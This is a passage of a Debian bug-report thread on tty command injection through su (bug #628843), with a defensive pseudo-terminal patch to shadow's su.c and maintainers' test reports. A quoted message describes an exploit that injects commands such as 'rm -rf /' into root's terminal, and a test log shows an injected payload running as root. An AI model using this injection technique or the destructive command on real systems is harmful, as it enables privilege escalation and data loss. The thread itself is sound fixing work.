solution inclusive patch
Date: Sun, 31 Mar 2013 19:34:51 +0200
```
Hello,

> I've successfuly tested an implementation which
> keeps the exploit running in the background
> _after_ returning control back to rot user. The
> running exploit then periodicaly inserts commands
> into root terminal, like whoami, rm -rf / etc :)
>
> So flushing the input queue isn't a complete
> solution.
>

Yes, You are right, this might work due the fact
that there is no control of additional forked
child's.

Further there is also additional the problem that
tty settings are not reset after return which
can be annoying as well but this is another story.

However, IMHO there might be two ways to handle
this issue which would be in figuring out if
permissions could handle that and the second
if it might be possible to control forked child's.

Would it be possible for You to post your
implementation?

Thanks.

Best regards
Wolf

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Mon, 08 Apr 2013 07:51:09 GMT) ([full text](bugreport.cgi?bug=628843;msg=138), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=138), [link](#137)).

---

**Acknowledgement sent**
to `Wolfgang Zarre <lkdev@essax.com>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Mon, 08 Apr 2013 07:51:09 GMT) ([full text](bugreport.cgi?bug=628843;msg=140), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=140), [link](#139)).

---

[Message #141](#141) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=141), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=141), reply):

![](/cgi-bin/libravatar.cgi?email=lkdev%40essax.com)
From: Wolfgang Zarre <lkdev@essax.com>
To: 628843@bugs.debian.org, nicolas.francois@centraliens.net,
Alexander Gattin <xrgtn@yandex.ru>
Subject: Bug#628843: login: tty hijacking - suggested solution inclusive patch
but now solved
Date: Mon, 08 Apr 2013 09:49:04 +0200
```
Hello,

As Alexander pointed out correctly the first suggested solution was not good enough
to solve the issue, but thanks to You @Alexander I could figure out the real issue.

Neither permission handling nor controlling the child process would resolve this
issue and also not assumed fixes in the implementation of TTY's Unix/Linux because
the issue it is simply the way how files are handled in a Unix system and a TTY is
just simply a file.

To demonstrate this just create a small program which is writing several text lines
to a file and change during execution ownership and permissions or even remove the
file and there will be no failure as long as the file handle is open.

In other words, if once a file descriptor is open and also if inherit from a forked
process, this process has all rights to do whatever it wants to do except if it
closes itself the file handle.

And that is exactly the issue with stdin in 'su' because after calling execve it
is out of our control if stdin gets closed or not.

In fact we need is the possibility to open a 'new' stdin just with the permissions
of the new session which we can close ourself at exit and this can be realised in
utilising pseudo terminal devices as implemented with the following patch.

Further the following patch was just tested roughly on Linux with PAM because of lack
of time but worked for me.

@Alexander:
I was using Your test procedure as You suggested but now if You want to have an
output You would have to redirect stdout and stderr to a file to see the result.

Another issue I realised during testing was the fact that the child process
cannot be killed with SIGTERM according to the blocked signal coded but which
might be a nice-to-have IMHO but I'm not sure if this behaviour is intentional
or not.

BTW: The patch is against shadow_4.1.5.1.orig.tar.gz which means without the
Debian patches.

___BEGIN_PATCH___
--- shadow-4.1.5.1.orig/src/su.c	2012-05-25 13:51:55.000000000 +0200
+++ shadow-4.1.5.1/src/su.c	2013-04-08 00:14:15.500412395 +0200
@@ -62,12 +62,10 @@
 #include <stdio.h>
 #include <sys/types.h>
 #include <unistd.h>
-#ifndef USE_PAM
 #include <sys/ioctl.h>
+#include <fcntl.h>
 #include <sys/types.h>
 #include <sys/stat.h>
-#include <fcntl.h>
-#endif				/* !USE_PAM */
 #include "prototypes.h"
 #include "defines.h"
 #include "pwauth.h"
@@ -85,6 +83,7 @@ const char *Prog;
 static /*@observer@*/const char *caller_tty = NULL;	/* Name of tty SU is run from */
 static bool caller_is_root = false;
 static uid_t caller_uid;
+static bool have_tty = false;
 #ifndef USE_PAM
 static bool caller_on_console = false;
 #ifdef SU_ACCESS
@@ -106,10 +105,10 @@ static bool change_environment = true;

 #ifdef USE_PAM
 static pam_handle_t *pamh = NULL;
+#endif
 static int caught = 0;
 /* PID of the child, in case it needs to be killed */
 static pid_t pid_child = 0;
-#endif

 /*
  * External identifiers
@@ -123,10 +122,9 @@ extern size_t newenvc; /* libmisc/env.c
 static void execve_shell (const char *shellname,
                           char *args[],
                           char *const envp[]);
-#ifdef USE_PAM
 static RETSIGTYPE kill_child (int unused(s));
-static void prepare_pam_close_session (void);
-#else				/* !USE_PAM */
+static void handle_session (void);
+#ifndef USE_PAM
 static RETSIGTYPE die (int);
 static bool iswheel (const char *);
 #endif				/* !USE_PAM */
@@ -177,7 +175,7 @@ static bool iswheel (const char *usernam
 	}
 	return is_on_list (grp->gr_mem, username);
 }
-#else				/* USE_PAM */
+#endif				/* USE_PAM */
 static RETSIGTYPE kill_child (int unused(s))
 {
 	if (0 != pid_child) {
@@ -189,7 +187,6 @@ static RETSIGTYPE kill_child (int unused
 	}
 	exit (255);
 }
-#endif				/* USE_PAM */

 /* borrowed from GNU sh-utils' "su.c" */
 static bool restricted_shell (const char *shellname)
@@ -260,7 +257,6 @@ static void execve_shell (const char *sh
 	}
 }

-#ifdef USE_PAM
 /* Signal handler for parent process later */
 static void catch_signals (int sig)
 {
@@ -268,19 +264,108 @@ static void catch_signals (int sig)
 }

 /*
- * prepare_pam_close_session - Fork and wait for the child to close the session
+ * handle_session - Fork and handle the session
  *
- *	Only the child returns. The parent will wait for the child to
+ *	Only the child returns. The parent will handle the session
+ *	or if not a controlling terminal then wait for the child to
  *	terminate and exit.
  */
-static void prepare_pam_close_session (void)
+static void handle_session (void)
 {
 	sigset_t ourset;
 	int status;
 	int ret;
+	int fd_ptmx = -1;
+	int fd_pts = -1;
+	char *pts_name = NULL;
+	struct termios termset_save;
+	struct termios termset_new;
+	fd_set inp_fds;
+	struct timeval sel_to;
+	char trbuf[BUFSIZ];
+	ssize_t bytes_r;
+	struct winsize winsz;
+	bool winsz_set = false;
+
+
+
+	if( isatty( 0) == 1) {
+		have_tty = true;
+
+		if( tcgetattr( STDIN_FILENO, &termset_save) == -1) {
+			fprintf( stderr, _("%s: Cannot get termios attributes\n"), Prog);
+			exit( 1);
+		}
+
+		if( ioctl( STDIN_FILENO, TIOCGWINSZ, &winsz) == -1 )
+			fprintf( stderr, _("%s: Cannot get window size\n"), Prog);
+		else
+			winsz_set = true;
+
+		/*
+		 * Open and prepare pseudo terminal master
+		 */
+		if( (fd_ptmx = open( "/dev/ptmx", O_RDWR)) == -1) {
+			fprintf( stderr, _("%s: Cannot open pt master\n"), Prog);
+			exit( 1);
+		}
+
+		if( grantpt( fd_ptmx) == -1) {
+			fprintf( stderr, _("%s: Cannot grant pt master permissions\n"), Prog);
+			close( fd_ptmx);
+			exit( 1);
+		}
+		if( unlockpt( fd_ptmx) == -1) {
+			fprintf( stderr, _("%s: Cannot unlock pt master\n"), Prog);
+			close( fd_ptmx);
+			exit( 1);
+		}
+
+		if( (pts_name = ptsname( fd_ptmx)) == NULL) {
+			fprintf( stderr, _("%s: Cannot get pt slave name\n"), Prog);
+			close( fd_ptmx);
+			exit( 1);
+		}
+
+		if( (fd_pts = open( pts_name, O_RDWR )) == -1) {
+			fprintf( stderr, _("%s: Cannot open pt slave\n"), Prog);
+			close( fd_ptmx);
+			exit( 1);
+		}
+	}
+
+

 	pid_child = fork ();
 	if (pid_child == 0) {	/* child shell */
+
+		if( have_tty == true) {
+			close( fd_ptmx);
+
+			if( tcsetattr( fd_pts, TCSANOW, &termset_save) == -1) {
+				fprintf( stderr, _("%s: Cannot set set termios attributes of sessiont\n"), Prog);
+				close( fd_pts);
+				exit (1);
+			}
+
+			if( winsz_set == true && ioctl( fd_pts, TIOCSWINSZ, &winsz) == -1)
+				fprintf( stderr, _("%s: Cannot set window size of session %d\n"), Prog, errno);
+
+			dup2( fd_pts, STDIN_FILENO);
+			dup2( fd_pts, STDOUT_FILENO);
+			dup2( fd_pts, STDERR_FILENO);
+
+			if( STDIN_FILENO != fd_pts && STDOUT_FILENO != fd_pts
+					&& STDERR_FILENO != fd_pts)
+				close( fd_pts);
+
+			if( setsid() == -1)
+				fprintf( stderr, _("%s: Cannot set process group leader\n"), Prog);
+			else
+				if( ioctl( STDIN_FILENO, TIOCSCTTY, 1) == -1)
+					fprintf( stderr, _("%s: Cannot set controlling terminal\n"), Prog);
+
+		}
 		return; /* Only the child will return from pam_create_session */
 	} else if ((pid_t)-1 == pid_child) {
 		(void) fprintf (stderr,
@@ -310,18 +395,9 @@ static void prepare_pam_close_session (v

 		if (   (sigaddset (&ourset, SIGTERM) != 0)
 		    || (sigaddset (&ourset, SIGALRM) != 0)
+		    || (sigaddset (&ourset, SIGWINCH) != 0)
 		    || (sigaction (SIGTERM, &action, NULL) != 0)
-		    || (   !doshell /* handle SIGINT (Ctrl-C), SIGQUIT
-		                     * (Ctrl-\), and SIGTSTP (Ctrl-Z)
-		                     * since the child will not control
-		                     * the tty.
-		                     */
-		        && (   (sigaddset (&ourset, SIGINT)  != 0)
-		            || (sigaddset (&ourset, SIGQUIT) != 0)
-		            || (sigaddset (&ourset, SIGTSTP) != 0)
-		            || (sigaction (SIGINT,  &action, NULL) != 0)
-		            || (sigaction (SIGQUIT, &action, NULL) != 0)
-		            || (sigaction (SIGTSTP,  &action, NULL) != 0)))
+		    || (sigaction (SIGWINCH, &action, NULL) != 0)
 		    || (sigprocmask (SIG_UNBLOCK, &ourset, NULL) != 0)
 		    ) {
 			fprintf (stderr,
@@ -331,6 +407,13 @@ static void prepare_pam_close_session (v
 		}
 	}

+	if( have_tty == true) {
+		/* Set RAW mode  */
+		termset_new = termset_save;
+		cfmakeraw( &termset_new);
+		tcsetattr( STDIN_FILENO, TCSANOW, &termset_new);
+	}
+
 	if (0 == caught) {
 		bool stop = true;

@@ -338,7 +421,10 @@ static void prepare_pam_close_session (v
 			pid_t pid;
 			stop = true;

-			pid = waitpid (-1, &status, WUNTRACED);
+			if( have_tty == true)
+				pid = waitpid (-1, &status, WUNTRACED |WNOHANG);
+			else
+				pid = waitpid (-1, &status, WUNTRACED);

 			/* When interrupted by signal, the signal will be
 			 * forwarded to the child, and termination will be
@@ -354,7 +440,7 @@ static void prepare_pam_close_session (v
 				 */
 				kill (pid_child, SIGSTOP);
 				stop = false;
-			} else if (   ((pid_t)-1 != pid)
+			} else if (   ((pid_t)-1 != pid && have_tty == false)
 			           && (0 != WIFSTOPPED (status))) {
 				/* The child (shell) was suspended.
 				 * Suspend su. */
@@ -362,10 +448,68 @@ static void prepare_pam_close_session (v
 				/* wake child when resumed */
 				kill (pid, SIGCONT);
 				stop = false;
+			} else if( pid == (pid_t)0 && have_tty == true) {
+				stop = false;
+
+				if( caught == SIGWINCH) {
+					caught = 0;
+					if( ioctl( STDIN_FILENO, TIOCGWINSZ, &winsz) != -1)
+						ioctl( fd_pts, TIOCSWINSZ, &winsz);
+				}
+
+	            FD_ZERO( &inp_fds);
+    	        FD_SET( STDIN_FILENO, &inp_fds);
+        	    FD_SET( fd_ptmx, &inp_fds);
+				sel_to = (struct timeval){ 0, 10000};
+
+	            if( select( fd_ptmx + 1, &inp_fds, NULL, NULL, &sel_to) == -1) {
+					if( errno == EINTR)
+						continue;
+					stop = true;
+				}
+            	if( FD_ISSET( STDIN_FILENO, &inp_fds)) {
+                	bytes_r = read( STDIN_FILENO, trbuf, BUFSIZ);
+                	if(	bytes_r <= 0) {
+						if( errno == EINTR)
+							continue;
+						fprintf( stderr, _("%s: Failure in reading from stdin\r\n"), Prog);
+                    	stop = true;
+					}
+
+                	if( bytes_r > 0 && write( fd_ptmx, trbuf, bytes_r) != bytes_r) {
+						if( errno == EINTR || errno == EIO)
+							continue;
+						fprintf( stderr, _("%s: Failure in writing to session\r\n"), Prog);
+						stop = true;
+					}
+            	}
+
+            	if( FD_ISSET( fd_ptmx, &inp_fds)) {
+                	bytes_r = read( fd_ptmx, trbuf, BUFSIZ);
+                	if( bytes_r <= 0) {
+						if( errno == EINTR || errno == EIO)
+							continue;
+						fprintf( stderr, _("%s: Failure in reading from session %d %ld\r\n"), Prog, errno, bytes_r);
+                    	stop = true;
+					}
+
+                	if( bytes_r > 0 && write( STDOUT_FILENO, trbuf, bytes_r) != bytes_r) {
+						fprintf( stderr, _("%s: Failure in writing to stdout\r\n"), Prog);
+						stop = true;
+					}
+            	}
 			}
 		} while (!stop);
 	}

+
+	if( have_tty == true) {
+		close( fd_pts);
+		/* Reset RAW mode  */
+		if( tcsetattr( STDIN_FILENO, TCSANOW, &termset_save) == -1)
+			fprintf( stderr, _("%s: Cannot reset termios attributes\n"), Prog);
+	}
+
 	if (0 != caught) {
 		(void) fputs ("\n", stderr);
 		(void) fputs (_("Session terminated, terminating shell..."),
@@ -373,6 +517,7 @@ static void prepare_pam_close_session (v
 		(void) kill (pid_child, caught);
 	}

+#ifdef USE_PAM
 	ret = pam_close_session (pamh, 0);
 	if (PAM_SUCCESS != ret) {
 		SYSLOG ((LOG_ERR, "pam_close_session: %s",
@@ -382,6 +527,7 @@ static void prepare_pam_close_session (v

 	(void) pam_setcred (pamh, PAM_DELETE_CRED);
 	(void) pam_end (pamh, PAM_SUCCESS);
+#endif				/* USE_PAM */

 	if (0 != caught) {
 		(void) signal (SIGALRM, kill_child);
@@ -395,7 +541,6 @@ static void prepare_pam_close_session (v
 	                                : WTERMSIG (status) + 128);
 	/* Only the child returns. See above. */
 }
-#endif				/* USE_PAM */

 /*
  * usage - print command line syntax and exit
@@ -1057,12 +1202,12 @@ int main (int argc, char **argv)
 		exit (1);
 	}

-	prepare_pam_close_session ();
-
 	/* become the new user */
 	if (change_uid (pw) != 0) {
 		exit (1);
 	}
+
+	handle_session ();
 #else				/* !USE_PAM */
 	/* no limits if su from root (unless su must fake login's behavior) */
 	if (!caller_is_root || fakelogin) {
@@ -1072,39 +1217,12 @@ int main (int argc, char **argv)
 	if (setup_uid_gid (pw, caller_on_console) != 0) {
 		exit (1);
 	}
-#endif				/* !USE_PAM */

-	set_environment (pw);
-
-	if (!doshell) {
-		/* There is no need for a controlling terminal.
-		 * This avoids the callee to inject commands on
-		 * the caller's tty. */
-		int err = -1;
+	handle_session ();
+#endif				/* !USE_PAM */

-#ifdef USE_PAM
-		/* When PAM is used, we are on the child */
-		err = setsid ();
-#else
-		/* Otherwise, we cannot use setsid */
-		int fd = open ("/dev/tty", O_RDWR);
-
-		if (fd >= 0) {
-			err = ioctl (fd, TIOCNOTTY, (char *) 0);
-			(void) close (fd);
-		} else if (ENXIO == errno) {
-			/* There are no controlling terminal already */
-			err = 0;
-		}
-#endif				/* USE_PAM */

-		if (-1 == err) {
-			(void) fprintf (stderr,
-			                _("%s: Cannot drop the controlling terminal\n"),
-			                Prog);
-			exit (1);
-		}
-	}
+	set_environment (pw);

 	/*
 	 * PAM_DATA_SILENT is not supported by some modules, and
___END_PATCH___

best regards

Wolf

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Fri, 19 Apr 2013 19:45:04 GMT) ([full text](bugreport.cgi?bug=628843;msg=143), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=143), [link](#142)).

---

**Acknowledgement sent**
to `Serge Hallyn <serge.hallyn@ubuntu.com>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Fri, 19 Apr 2013 19:45:04 GMT) ([full text](bugreport.cgi?bug=628843;msg=145), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=145), [link](#144)).

---

[Message #146](#146) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=146), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=146), reply):

![](/cgi-bin/libravatar.cgi?email=serge.hallyn%40ubuntu.com)
From: Serge Hallyn <serge.hallyn@ubuntu.com>
To: Wolfgang Zarre <lkdev@essax.com>, 628843@bugs.debian.org
Cc: nicolas.francois@centraliens.net, Alexander Gattin <xrgtn@yandex.ru>
Subject: Re: [Pkg-shadow-devel] Bug#628843: login: tty hijacking - suggested
solution inclusive patch but now solved
Date: Fri, 19 Apr 2013 14:42:19 -0500
```
Hi,

with the stock debian shadow packages, trying the exploit in message #86
gives me:

root@d2:~# su - testme
exit
echo Payload as $(whoami)
testme@d2:~$ exit
logout
root@d2:~# echo Payload as $(whoami)
Payload as root

With this patch on top of 4.1.5, I get

root@d3:~# su - testme
configuration error - unknown item 'FAILLOG_ENAB' (notify administrator)
configuration error - unknown item 'FTMP_FILE' (notify administrator)
exit
echo Payload as $(whoami)
testme@d3:~$ exit
logout

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Fri, 10 May 2013 06:45:09 GMT) ([full text](bugreport.cgi?bug=628843;msg=148), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=148), [link](#147)).

---

**Acknowledgement sent**
to `Tim Connors <reportbug@rather.puzzling.org>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Fri, 10 May 2013 06:45:09 GMT) ([full text](bugreport.cgi?bug=628843;msg=150), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=150), [link](#149)).

---

[Message #151](#151) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=151), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=151), reply):

![](/cgi-bin/libravatar.cgi?email=reportbug%40rather.puzzling.org)
From: Tim Connors <reportbug@rather.puzzling.org>
To: 663200@bugs.debian.org, 628843@bugs.debian.org
Cc: Nicolas François <nicolas.francois@centraliens.net>,
Francois Gouget <fgouget@free.fr>
Subject: Re: Bug#659878: cannot set terminal process group (-1): Inappropriate
ioctl for device
Date: Fri, 10 May 2013 16:40:16 +1000 (EST)
```
On Fri, 10 May 2013, Tim Connors wrote:

> Actually, the other thing you lose (I presuming caused by acting on bug
> #628843) is tty resizing by SIGWINCH.  ttys are really useful, it turns
> out.
>
> I have shedloads of up-to-date security patched RHEL5/6 machines, and I've
> never come across this problem on them.  Yep:
> rhel6> su -c  -u root 'cat /dev/tty'
> Password:
> asdasda
> asdasda
> debian-wheezy> su -c  -u root 'cat /dev/tty'
> Password:
> cat: /dev/tty: No such device or address
>
> Sorry, marking this bug as RC (pity I missed wheezy!), breaks other
> software.

As per some comments in #628843, the way this bug was addressed breaks su
-c to increase privledges.  It also breaks su -c to become a user and
execute something interactive.  Root isn't going to be doing stupid things
and running scripts that have been compromised (if they are, then they've
got bigger problems), so what's the problem? (why on earth would root ever
su to an untrusted user account?) I think this change should just be
backed out, and a prominent warning about the tty exploit placed in the
manpage.

--
Tim Connors

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Fri, 10 May 2013 10:27:04 GMT) ([full text](bugreport.cgi?bug=628843;msg=153), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=153), [link](#152)).

---

**Acknowledgement sent**
to `Wolfgang Zarre <lkdev@essax.com>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Fri, 10 May 2013 10:27:04 GMT) ([full text](bugreport.cgi?bug=628843;msg=155), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=155), [link](#154)).

---

[Message #156](#156) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=156), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=156), reply):

![](/cgi-bin/libravatar.cgi?email=lkdev%40essax.com)
From: Wolfgang Zarre <lkdev@essax.com>
To: Tim Connors <reportbug@rather.puzzling.org>, 628843@bugs.debian.org,
serge.hallyn@ubuntu.com
Cc: 663200@bugs.debian.org, Nicolas François
<nicolas.francois@centraliens.net>, Francois Gouget <fgouget@free.fr>
Subject: Re: Bug#628843: Bug#659878: cannot set terminal process group (-1):
Inappropriate ioctl for device
Date: Fri, 10 May 2013 12:24:10 +0200
```
As information at present I have a bit more time left in testing and
reworking the patch I sent with #141 which has some smaller issues with
signalling mostly SIGSTOP and SIGCONT and I hope that I can submit the
rework during this weekend.

@Serge
I'm sorry but I couldn't reproduce the behaviour as You submitted with
#146 and therefore I would like to ask You if You could provide me
with the checksums as in the .dsc file, if You run on 32Bit or
64Bit and if You have USE_PAM enabled or not.

Maybe I might be able to improve the patch or to fix that issue.

>> Actually, the other thing you lose (I presuming caused by acting on bug
>> #628843) is tty resizing by SIGWINCH.  ttys are really useful, it turns
>> out.
>>

No, this clearly comes from the tcsetpgrp() call inside bash returning -1 with
errno set to ENOTTY because of the missing controlling tty.

>
> As per some comments in #628843, the way this bug was addressed breaks su
> -c to increase privledges.  It also breaks su -c to become a user and
> execute something interactive.  Root isn't going to be doing stupid things
> and running scripts that have been compromised (if they are, then they've
> got bigger problems), so what's the problem? (why on earth would root ever
> su to an untrusted user account?) I think this change should just be
> backed out, and a prominent warning about the tty exploit placed in the
> manpage.
>

But this would be fixed with the patch in #141 without having any restrictions.

However, I don't agree with the statement that 'root' would never su to an
untrusted user account beside that, that from administrator point of view every
user account is 'untrusted' and in fact it is quite often that this happens
that 'root' is su'ing to non privileged users beside using a lot of starting
and maintenance scripts which are invoking su.

IMHO it is better to fix what is fixable to improve quality and safety instead
of making workarounds and warnings.

Best regards
Wolf

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Tue, 20 Aug 2013 23:36:09 GMT) ([full text](bugreport.cgi?bug=628843;msg=158), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=158), [link](#157)).

---

**Acknowledgement sent**
to `Nicolas François <nicolas.francois@centraliens.net>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Tue, 20 Aug 2013 23:36:09 GMT) ([full text](bugreport.cgi?bug=628843;msg=160), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=160), [link](#159)).

---

[Message #161](#161) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=161), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=161), reply):

![](/cgi-bin/libravatar.cgi?email=nicolas.francois%40centraliens.net)
From: Nicolas François <nicolas.francois@centraliens.net>
To: Wolfgang Zarre <lkdev@essax.com>, 628843@bugs.debian.org
Cc: Tim Connors <reportbug@rather.puzzling.org>, serge.hallyn@ubuntu.com,
663200@bugs.debian.org, Francois Gouget <fgouget@free.fr>
Subject: Re: Bug#628843: Bug#659878: cannot set terminal process group (-1):
Inappropriate ioctl for device
Date: Wed, 21 Aug 2013 01:32:36 +0200
```
Hello,

I created a branch (su-C_tty) starting with the patch from Wolfgang Zarre
(comment 141 in #628843). Thanks!

It seems to be the only way to fix this issue, even if it means I have to
maintain something I'm not confident with.

There is one thing I don't understand (let's start with this one):
When I execute a command with su –c <command>, it does not react to
SIGTSTP (either from Ctrl-Z or kill -SIGTSTP). It works OK when I execute
a shell.

Is this behavior expected? What is the reason?

Thanks in advance,
--
Nekral

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Tue, 27 Aug 2013 10:27:09 GMT) ([full text](bugreport.cgi?bug=628843;msg=163), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=163), [link](#162)).

---

**Acknowledgement sent**
to `Wolfgang Zarre <lkdev@essax.com>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Tue, 27 Aug 2013 10:27:09 GMT) ([full text](bugreport.cgi?bug=628843;msg=165), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=165), [link](#164)).

---

[Message #166](#166) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=166), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=166), reply):

![](/cgi-bin/libravatar.cgi?email=lkdev%40essax.com)
From: Wolfgang Zarre <lkdev@essax.com>
To: Nicolas François
<nicolas.francois@centraliens.net>
Cc: 628843@bugs.debian.org, Tim Connors <reportbug@rather.puzzling.org>,
serge.hallyn@ubuntu.com, 663200@bugs.debian.org,
Francois Gouget <fgouget@free.fr>
Subject: Re: Bug#628843: Bug#659878: cannot set terminal process group (-1):
Inappropriate ioctl for device
Date: Tue, 27 Aug 2013 11:43:59 +0200
```
Hello,

First, I'm sorry that it took me now nearly three month to finish because always
when I have the impression having time left it turns the opposite.

However, finally I managed that the patch is working so far but it's not fully
tested.

Currently I just tested on amd64, with PAM authentication with bash job controlling
foreground/background and SIGSTOP/SIGCONT processes, so tests with other platforms and
shells are still necessary including non PAM authentication.

>
> I created a branch (su-C_tty) starting with the patch from Wolfgang Zarre
> (comment 141 in #628843). Thanks!

You are welcome! The branch is on svn.debian.org ?

> There is one thing I don't understand (let's start with this one):
> When I execute a command with su –c <command>, it does not react to
> SIGTSTP (either from Ctrl-Z or kill -SIGTSTP). It works OK when I execute
> a shell.
>
> Is this behavior expected? What is the reason?

Actually it's not expected however, there where issues as mentioned in #156
but was targeting more the issues as mentioned above to switch correct the
parent's tty between cooked and raw mode.

A short test was showing now that this is really not working as expected and
I'll try to investigate and rework the patch accordingly.

Best regards
Wolf

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Thu, 29 Aug 2013 22:39:04 GMT) ([full text](bugreport.cgi?bug=628843;msg=168), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=168), [link](#167)).

---

**Acknowledgement sent**
to `Nicolas François <nicolas.francois@centraliens.net>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Thu, 29 Aug 2013 22:39:04 GMT) ([full text](bugreport.cgi?bug=628843;msg=170), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=170), [link](#169)).

---

[Message #171](#171) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=171), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=171), reply):

![](/cgi-bin/libravatar.cgi?email=nicolas.francois%40centraliens.net)
From: Nicolas François <nicolas.francois@centraliens.net>
To: Wolfgang Zarre <lkdev@essax.com>, 663200@bugs.debian.org
Cc: Francois Gouget <fgouget@free.fr>,
Tim Connors <reportbug@rather.puzzling.org>, 628843@bugs.debian.org
Subject: Re: [Pkg-shadow-devel] Bug#663200: Bug#628843: Bug#659878: cannot
set terminal process group (-1): Inappropriate ioctl for device
Date: Fri, 30 Aug 2013 00:34:46 +0200
```
Hi,

On Tue, Aug 27, 2013 at 11:43:59AM +0200, lkdev@essax.com wrote:
>
> First, I'm sorry that it took me now nearly three month to finish because always
> when I have the impression having time left it turns the opposite.

I can't blame you here...

> > I created a branch (su-C_tty) starting with the patch from Wolfgang Zarre
> > (comment 141 in #628843). Thanks!
>
> You are welcome! The branch is on svn.debian.org ?

There's been a switch to git in the mean time.
You can find the repo on github:
<https://github.com/shadow-maint/shadow>

> > There is one thing I don't understand (let's start with this one):
> > When I execute a command with su –c <command>, it does not react to
> > SIGTSTP (either from Ctrl-Z or kill -SIGTSTP). It works OK when I execute
> > a shell.
> >
> > Is this behavior expected? What is the reason?
>
> Actually it's not expected however, there where issues as mentioned in #156
> but was targeting more the issues as mentioned above to switch correct the
> parent's tty between cooked and raw mode.
>
> A short test was showing now that this is really not working as expected and
> I'll try to investigate and rework the patch accordingly.

Thanks for your time.

Best Regards,
--
Nekral

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Sun, 15 Sep 2013 07:51:05 GMT) ([full text](bugreport.cgi?bug=628843;msg=173), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=173), [link](#172)).

---

**Acknowledgement sent**
to `Wolfgang Zarre <lkdev@essax.com>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Sun, 15 Sep 2013 07:51:05 GMT) ([full text](bugreport.cgi?bug=628843;msg=175), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=175), [link](#174)).

---

[Message #176](#176) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=176), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=176), reply):

![](/cgi-bin/libravatar.cgi?email=lkdev%40essax.com)
From: Wolfgang Zarre <lkdev@essax.com>
To: Nicolas François
<nicolas.francois@centraliens.net>
Cc: 663200@bugs.debian.org, Francois Gouget <fgouget@free.fr>,
Tim Connors <reportbug@rather.puzzling.org>,
628843@bugs.debian.org
Subject: Re: [Pkg-shadow-devel] Bug#663200: Bug#628843: Bug#659878: cannot
set terminal process group (-1): Inappropriate ioctl for device
Date: Sun, 15 Sep 2013 09:47:13 +0200
```
Hi,

> There's been a switch to git in the mean time.

I prefer git.

> You can find the repo on github:
> <https://github.com/shadow-maint/shadow>
>

I cloned and I tried to merge as good as possible and therefore
I did also some rework.

Now Ctrl-Z is working as well as expected.

Beside a working version now there might be still
some improvements necessary, corrections or fixes.

Maybe some thoughts and notes to the merge:

@@ -360,14 +402,6 @@:
    I removed the terminal setting of the child due the fact
    that actually the system settings should be set like the
    same as at a normal login including the personal settings
    of a user.

@@ -423,7 +457,7 @@:
    I case of failures it is IMHO better to set SIGHUP instead
